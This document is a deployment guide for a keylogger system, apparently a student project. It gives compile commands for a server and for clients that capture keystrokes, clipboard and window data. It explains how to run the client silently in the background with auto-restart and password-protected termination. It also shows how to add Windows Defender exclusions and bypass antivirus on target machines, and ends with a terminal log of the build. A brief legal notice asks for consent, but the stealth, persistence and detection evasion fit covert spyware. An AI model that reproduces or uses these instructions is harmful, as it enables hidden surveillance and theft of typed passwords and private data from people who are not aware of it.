# Keystroke Monitoring System - Complete Guide

## 📋 Table of Contents
1. [Overview](#overview)
2. [Server Setup](#server-setup)
3. [Windows Client Distribution](#windows-client-distribution)
4. [Linux Client Distribution](#linux-client-distribution)
5. [Security & Permissions](#security--permissions)
6. [Troubleshooting](#troubleshooting)

---

## 🎯 Overview

This system consists of:
- **Server**: Receives and displays keystroke data from clients
- **Client**: Captures keystrokes, clipboard, and window data
- **Launcher**: Protected process manager with password-based exit
- **Guardian Exit**: Tool to stop protected processes

---

## 🖥️ Server Setup

### Compilation

**Windows Server:**
```bash
# Open PowerShell or CMD in your source directory
g++ server_main.cpp -o server.exe -lws2_32 -std=c++17 -pthread
```

**Linux Server:**
```bash
# Open terminal in your source directory
g++ server_main.cpp -o server -std=c++17 -pthread

# Make executable
chmod +x server
```

### Running the Server

**Windows:**
```bash
server.exe 8080
```

**Linux:**
```bash
./server 8080
```

**Note:** Choose any available port (common choices: 8080, 3000, 5000)

### Server Requirements
- ✅ Public IP address or accessible network
- ✅ Firewall configured to allow incoming connections on chosen port
- ✅ Port forwarding enabled if behind router

---

## 💻 Windows Client Distribution

### 1. Compilation (On Development Machine)

```bash
# Compile the client
g++ client_main.cpp -o client.exe -lws2_32 -std=c++17 -pthread

# Compile the launcher (background mode)
g++ launcher_windows_simple.cpp -o launcher.exe -lws2_32 -std=c++17 -pthread -mwindows

# Compile the guardian exit tool
g++ guardian_exit_windows.cpp -o guardian_exit.exe -std=c++17
```

### 2. Files to Distribute to Windows Clients

Send these **3 files** to your Windows client:

```
📦 Client Package:
   ├── client.exe          (Main monitoring program)
   ├── launcher.exe        (Protected launcher)
   └── guardian_exit.exe   (Emergency exit tool)
```

### 3. Client Connection Instructions (Windows)

Provide these instructions to your Windows clients:

```
╔════════════════════════════════════════════════════════════╗
║           WINDOWS CLIENT SETUP INSTRUCTIONS                ║
╚════════════════════════════════════════════════════════════╝

1. Extract all 3 files to a folder (e.g., C:\Monitoring)

2. Open Command Prompt (CMD) or PowerShell

3. Navigate to the folder:
   cd C:\Monitoring

4. Run the launcher:
   launcher.exe <SERVER_IP> <PORT> <YOUR_ID>
   
   Example:
   launcher.exe 192.168.1.100 8080 john_pc

5. The client will start in BACKGROUND MODE:
   ✓ No visible window
   ✓ Runs silently
   ✓ Auto-restarts if crashed
   ✓ Survives closing Command Prompt

6. To stop monitoring (password required):
   guardian_exit.exe
   
   Or type in the launcher console:
   exit
   
   Password: abd101
```

### 4. Windows Permissions & Security

**Do you need to change file permissions?**
- ❌ **No special permissions needed** on Windows
- The .exe files will run with standard user privileges
- Windows Defender might flag them - this is normal for keyloggers

**Bypassing Windows Defender (For Testing Only):**
```powershell
# Add folder to exclusion list (Run PowerShell as Administrator)
Add-MpPreference -ExclusionPath "C:\Monitoring"
```

---

## 🐧 Linux Client Distribution

### 1. Compilation (On Development Machine)

```bash
# Compile the client
g++ client_main.cpp -o client -lX11 -std=c++17 -pthread

# Compile the launcher (daemon mode)
g++ launcher_linux.cpp -o launcher -std=c++17 -pthread

# Compile the guardian exit tool
g++ guardian_exit.cpp -o guardian_exit -std=c++17

# Make all executables
chmod +x client launcher guardian_exit
```

### 2. Files to Distribute to Linux Clients

Send these **3 files** to your Linux client:

```
📦 Client Package:
   ├── client           (Main monitoring program)
   ├── launcher         (Protected launcher)
   └── guardian_exit    (Emergency exit tool)
```

### 3. Client Connection Instructions (Linux)

Provide these instructions to your Linux clients:

```
╔════════════════════════════════════════════════════════════╗
║            LINUX CLIENT SETUP INSTRUCTIONS                 ║
╚════════════════════════════════════════════════════════════╝

1. Extract all 3 files to a folder (e.g., ~/monitoring)

2. Make files executable:
   chmod +x client launcher guardian_exit

3. IMPORTANT: You need ROOT access for keyboard capture!

4. Run the launcher with sudo:
   sudo ./launcher <SERVER_IP> <PORT> <YOUR_ID>
   
   Example:
   sudo ./launcher 192.168.1.100 8080 john_ubuntu

5. The launcher will DAEMONIZE (run in background):
   ✓ Process detaches from terminal
   ✓ Runs as background daemon
   ✓ Terminal can be closed
   ✓ Survives logout (if properly configured)

6. To stop monitoring (password required):
   sudo ./guardian_exit
   
   Password: abd101

7. Checking if it's running:
   ps aux | grep launcher
   ps aux | grep client
```

### 4. Linux Permissions & Security

**Do you need to change file permissions?**
- ✅ **YES** - Must use `chmod +x` on all executables
- ✅ **YES** - Must run with `sudo` (root access required)

**Why sudo is required:**
- Reading keyboard input from `/dev/input/eventX` requires root
- X11 display access may need elevated permissions
- Signal management requires process control privileges

**Setting up without sudo (Advanced):**
```bash
# Add user to input group
sudo usermod -a -G input $USER

# Create udev rule for keyboard access
sudo nano /etc/udev/rules.d/99-input.rules

# Add this line:
KERNEL=="event*", SUBSYSTEM=="input", MODE="0660", GROUP="input"

# Reload udev rules
sudo udevadm control --reload-rules
sudo udevadm trigger

# Logout and login again
```

---

## 🔐 Security & Permissions

### Changing the Guardian Password

**⚠️ CRITICAL: Change before distribution!**

Edit `launcher_common.hpp`:
```cpp
// Find this line:
const std::string GUARDIAN_PASSWORD = "abd101";

// Change to your secure password:
const std::string GUARDIAN_PASSWORD = "YourSecurePassword123!";
```

**Then recompile ALL files:**
- launcher.exe / launcher
- guardian_exit.exe / guardian_exit

### Antivirus Considerations

**Your keylogger WILL be detected by antivirus software** because:
- It captures keystrokes (keylogger behavior)
- It runs hidden processes
- It prevents termination

**For Distribution:**
1. **Test Environment**: Disable AV temporarily
2. **Production**: 
   - Code-sign your executables (Windows)
   - Add to AV exclusions on client machines
   - Explain to clients this is intentional monitoring

---

## 🔧 Troubleshooting

### Windows Issues

**Problem: "launcher.exe is not recognized"**
```bash
# Solution: Use full path
C:\Monitoring\launcher.exe 192.168.1.100 8080 client1
```

**Problem: "Connection failed"**
- ✅ Check server IP is correct
- ✅ Check firewall allows port 8080
- ✅ Verify server is running: `netstat -an | findstr 8080`

**Problem: "Windows Defender blocked it"**
```powershell
# Run as Administrator
Add-MpPreference -ExclusionPath "C:\Monitoring"
```

### Linux Issues

**Problem: "Permission denied"**
```bash
# Solution: Use sudo
sudo ./launcher 192.168.1.100 8080 client1
```

**Problem: "Failed to open keyboard device"**
```bash
# Check available input devices
ls -l /dev/input/event*

# Try different event number in keyboard_capture.hpp
# Or use sudo
```

**Problem: "Cannot connect to X server"**
```bash
# Set DISPLAY variable
export DISPLAY=:0
sudo -E ./launcher 192.168.1.100 8080 client1
```

**Problem: "Process not running in background"**
```bash
# Check if daemon started
ps aux | grep launcher

# Check log file
cat /tmp/launcher_daemon.log
```

### Network Issues

**Problem: "Connection refused"**
1. Verify server is running: `netstat -tuln | grep 8080`
2. Check firewall rules
3. Test connectivity: `telnet SERVER_IP 8080`

**Problem: "Client connects but no data shown"**
1. Check client is running: Task Manager (Windows) or `ps aux` (Linux)
2. Verify keyboard capture is working
3. Check client logs

---

## 📊 Monitoring Multiple Clients

The server supports multiple simultaneous clients:

```bash
# Server shows each client separately:
=== Client: john_pc ===
Recent events:
  1. KEY: H
  2. KEY: E
  3. KEY: L
  4. KEY: L
  5. KEY: O
==================

=== Client: jane_laptop ===
Recent events:
  1. KEY: W
  2. KEY: O
  3. KEY: R
  4. KEY: K
==================
```

---

## 🎯 Quick Start Summary

### For Server Operator:
```bash
# 1. Compile server
g++ server_main.cpp -o server -std=c++17 -pthread

# 2. Run server
./server 8080

# 3. Note your public IP
curl ifconfig.me

# 4. Send IP and port to clients
```

### For Windows Clients:
```bash
# 1. Receive: client.exe, launcher.exe, guardian_exit.exe
# 2. Run: launcher.exe <SERVER_IP> 8080 <YOUR_ID>
# 3. Exit: guardian_exit.exe (password: abd101)
```

### For Linux Clients:
```bash
# 1. Receive: client, launcher, guardian_exit
# 2. chmod +x client launcher guardian_exit
# 3. sudo ./launcher <SERVER_IP> 8080 <YOUR_ID>
# 4. sudo ./guardian_exit (password: abd101)
```

---

## ⚖️ Legal Notice

**This software is for educational and authorized monitoring purposes only.**

- ✅ Obtain written consent before monitoring
- ✅ Comply with local laws regarding surveillance
- ✅ Use only on systems you own or have permission to monitor
- ❌ Unauthorized monitoring may be illegal

**The developers assume no liability for misuse of this software.**

---

## 📞 Support

For issues or questions:
1. Check the troubleshooting section
2. Verify all compilation steps were followed
3. Test on local network first before remote deployment
4. Ensure all firewall rules are configured correctly

---

**Version:** 1.0  
**Last Updated:** December 2025  
**Platform Support:** Windows 10+, Ubuntu 20.04+




/////////////////////////////////


abd@abdullah:~/SEM-03/DSA/curr/bg/sample_03$ g++ client_main.cpp -o client -lX11 -std=c++17 -pthread
abd@abdullah:~/SEM-03/DSA/curr/bg/sample_03$ g++ launcher_linux.cpp -o launcher -std=c++17 -pthread
abd@abdullah:~/SEM-03/DSA/curr/bg/sample_03$ g++ guardian_exit.cpp -o guardian_exit -std=c++17
abd@abdullah:~/SEM-03/DSA/curr/bg/sample_03$ chmod +x client launcher guardian_exit
abd@abdullah:~/SEM-03/DSA/curr/bg/sample_03$ g++ server_main.cpp -o server -std=c++17 -pthread
abd@abdullah:~/SEM-03/DSA/curr/bg/sample_03$ chmod +x server
abd@abdullah:~/SEM-03/DSA/curr/bg/sample_03$ 


